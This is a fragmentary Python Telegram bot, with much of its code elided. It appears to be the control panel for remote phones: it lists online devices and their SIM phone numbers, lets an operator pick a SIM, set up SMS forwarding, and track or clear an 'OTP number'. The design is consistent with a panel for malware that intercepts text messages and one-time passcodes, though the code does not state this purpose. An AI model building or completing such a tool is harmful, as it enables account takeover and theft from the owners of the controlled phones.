...
# Updated Channel & Developer Info
...
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if cfg.get("firebase_url") and cfg.get("channel_id"):
        await update.message.reply_text(
            f"<b>⚡ {BOT_NAME}</b>\n\n"
...
async def setup_firebase_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    # Check if channel is already set, if not ask for it
...
async def setup_channel_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await update.message.reply_text(
        ...
        f"Use /devices to select device.",
        parse_mode="HTML"
    )
    return ConversationHandler.END
...
async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if not context.args:
        msg = "<b>📱 Select a device:</b>\n\n"
        for i, (dev_id, data) in enumerate(online.items(), 1):
            msg += f"{i}. <code>{dev_id[:10]}...</code> - {data['modelName']}\n"
        msg += "\nUse: <code>/devices &lt;device_id&gt;</code>\nExample: /devices abc123def"
    ...
    if not device_data:
        await update.message.reply_text("❌ Device not found or offline.", parse_mode="HTML")
        return
    
    sims = device_data.get("sims", [])
    if not sims:
        await update.message.reply_text("❌ No SIMs on this device.", parse_mode="HTML")
        return
    
    if len(context.args) < 2:
        msg = f"<b>📱 Device:</b> <code>{device_data['modelName']}</code>\n\n<b>Select SIM:</b>\n"
        for i, sim in enumerate(sims, 1):
            msg += f"{i}. SIM {sim.get('simSlotIndex')} - {sim.get('phoneNumber')}\n"
        msg += "\nUse: <code>/devices &lt;device_id&gt; &lt;sim_slot&gt;</code>\nExample: /devices abc123def 1"
        await update.message.reply_text(msg, parse_mode="HTML")
        return
    
    try:
        sim_slot = int(context.args[1])
    except:
        await update.message.reply_text("❌ SIM slot must be a number.", parse_mode="HTML")
        return
    
    selected_sim = None
    for sim in sims:
        if sim.get("simSlotIndex") == sim_slot:
            selected_sim = sim
            break
    
    if not selected_sim:
        await update.message.reply_text("❌ SIM not found.", parse_mode="HTML")
        return
    
    set_selected(user_id, device_id, sim_slot, selected_sim.get("phoneNumber"))
    await update.message.reply_text(
        f"✅ <b>Device Selected!</b>\n\n"
        f"📱 Device: <code>{device_id}</code>\n"
        f"📶 SIM: <code>{selected_sim.get('phoneNumber')}</code>\n\n"
        f"Now set SMS forward using /setsms\n\n"
        f"<b>Support:</b> {DEV_SUPPORT}",
        parse_mode="HTML"
    )
...
async def forcestop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    # Clear OTP and forward number instantly
    user_configs[user_id]["otpNumber"] = None
    save_user_configs()
...
def main():
    ...
    logger.info("🤖 Bot started (Full Command Version)!")
